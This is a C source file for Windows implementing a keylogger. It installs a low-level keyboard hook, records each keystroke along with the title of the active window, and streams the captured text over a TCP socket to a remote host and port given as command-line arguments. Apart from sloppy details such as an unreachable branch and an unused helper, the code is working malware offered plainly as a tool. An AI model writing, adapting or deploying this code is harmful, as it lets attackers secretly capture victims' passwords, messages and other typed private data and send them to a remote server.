#include <stdio.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>

char curr_window_title[256];
char prev_window_title[256];
char window_title[256 + 16];
HWND curr_window;
HWND prev_window;
SOCKET connection;
int upper;
int lower;
int shift;



//Key mappings
typedef struct {
    DWORD vk_code;
    const char* character;
} keymap;


// keymap action_key_map[] = {

//     { VK_RETURN,   " [Enter]\n" },
//     { VK_SPACE,    " " },
//     { VK_BACK,     " [Backspace] " },
//     { VK_MENU,     " [ALT] " },
//     { VK_RMENU,    " [ALT] " },
//     { VK_TAB,      " [TAB] " },
//     { VK_LCONTROL, " [CTRL] " },
//     { VK_RCONTROL, " [CTRL] " },
    
// };

// keymap special_char_key_map[] = {

//     { VK_OEM_1, "!" },
    

// };

LPWORD get_char(UINT vk_code, BYTE keyboard_state[])
{
    LPWORD ch;

    ToAscii(vk_code, MapVirtualKey(vk_code, MAPVK_VK_TO_VSC), keyboard_state, (WORD *) &ch, 0);

    return ch;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    curr_window = GetForegroundWindow();

    if (curr_window) {
        GetWindowText(curr_window, curr_window_title, sizeof(curr_window_title));

        // If window title changed. Update to new window title.
        if (strcmp(curr_window_title, prev_window_title) && curr_window != prev_window) {

            memset(prev_window_title, 0, sizeof(prev_window_title));
            memcpy(prev_window_title, curr_window_title, sizeof(curr_window_title));

            prev_window = curr_window;

            memset(window_title, 0, sizeof(window_title));
            sprintf(window_title, "\nFocused Window: %s\n", curr_window_title);
            send(connection, window_title, sizeof(window_title), 0);
        }
    }

    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb_struct = (KBDLLHOOKSTRUCT*)lParam;
        UINT vk_code = kb_struct->vkCode;

        BYTE key_state[256];

        // Get the current key state
        GetKeyboardState(key_state);

        if (GetAsyncKeyState(VK_SHIFT) < 0 || GetKeyState(VK_CAPITAL) > 0) {
            // Shift key is pressed or Caps Lock is on, use uppercase
            upper = 1;
            lower = 0;
        } else if (GetAsyncKeyState(VK_SHIFT) < 0 && GetKeyState(VK_CAPITAL) > 0) {
            // Shift key is pressed AND Caps Lock is on, use lowercase
            upper = 0;
            lower = 1;
            shift = 1;
        } else {
            // Shift key is not pressed and Caps Lock is off, use lowercase
            upper = 0;
            lower = 1;
        }

        if (vk_code == VK_RETURN) {
            send(connection, " [Enter]\n", sizeof(" [Enter]\n"), 0);
        } else if (vk_code == VK_SPACE) {
            send(connection, " ", sizeof(" "), 0);
        } else if (vk_code == VK_BACK) {
            send(connection, " [Backspace] ", sizeof(" [Backspace] "), 0);
        } else if (vk_code == VK_MENU || vk_code == VK_RMENU) {
            send(connection, " [ALT] ", sizeof(" [ALT] "), 0);
        } else if (vk_code == VK_TAB) {
            send(connection, " [TAB] ", sizeof(" [TAB] "), 0);
        } else if (vk_code == VK_LCONTROL || vk_code == VK_RCONTROL) {
            send(connection, " [CTRL] ", sizeof(" [CTRL] "), 0);
        } else {
            char key[2];
            key[0] = MapVirtualKey(vk_code, MAPVK_VK_TO_CHAR);
            key[1] = '\0';

            if (upper) {
                send(connection, key, sizeof(key), 0);
            } else {
                char lowercase_key = tolower((unsigned char)key[0]);
                send(connection, &lowercase_key, sizeof(lowercase_key), 0);
            }
        }

    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

SOCKET open_connection(char* host, int port)
{
    WSADATA wsa_data;
    SOCKET connection = INVALID_SOCKET;
    struct sockaddr_in server_addr;
    int bytes_read;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    // Create a socket
    if ((connection = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Failed to create socket.\n");
        WSACleanup();
        return 1;
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(host);
    server_addr.sin_port = htons(port);

    // Connect to the server
    if (connect(connection, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Failed to connect to the server.\n");
        closesocket(connection);
        WSACleanup();
        return 1;
    }

    return connection;
}

int main(int argc, char *argv[])
{
    int port;
    char *host;

    // Check if the required number of arguments is provided
    if (argc < 5) {
        fprintf(stderr, "Usage: %s -h <server_address> -p <port>\n", argv[0]);
        exit(1);
    }

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        // Check for port switch
        if (strcmp(argv[i], "-p") == 0) {
            if (argv[i + 1]) {
                port = atoi(argv[i + 1]);
                if (port <= 0) {
                    fprintf(stderr, "[ERROR] Port must be a positive integer.\n");
                    return 1;
                }
            }
        }

        // Check for host switch
        if (strcmp(argv[i], "-h") == 0) {
            if (argv[i + 1]) {
                host = argv[i + 1];
            }
        }

        // Add other switches here if needed.
    }

    connection = open_connection(host, port);

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    // Close the socket and clean up Winsock
    closesocket(connection);
    WSACleanup();

    return 0;
}
